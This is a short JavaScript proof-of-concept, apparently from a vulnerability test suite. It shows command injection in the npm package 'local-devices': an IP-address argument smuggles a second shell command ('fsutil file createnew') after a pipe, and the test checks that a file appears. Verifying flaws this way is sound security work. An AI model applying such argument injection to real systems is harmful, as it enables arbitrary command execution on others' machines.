// test("Arbitrary code execution in local-devices", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const find = require("local-devices");
  const path = "./local-devices";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  let userInput = "127.0.0.1 | fsutil file createnew local-devices 0";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {});
  });
// });
